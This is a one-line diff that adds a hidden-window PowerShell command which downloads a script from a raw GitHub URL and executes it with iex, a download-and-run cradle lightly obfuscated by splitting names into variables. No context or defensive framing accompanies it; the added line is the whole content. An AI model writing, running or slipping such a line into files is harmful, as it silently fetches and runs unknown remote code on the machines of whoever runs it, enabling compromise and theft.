@@ -1,0 +1,1 @@
+powershell.exe -WindowStyle Hidden -Command "$a='https://raw.githubusercontent.com/hypnotixx0/unhiinps/main/obfouttfd.ps1';$b='Net.WebClient';$c=New-Object $b;$d=$c.DownloadString($a);iex $d"
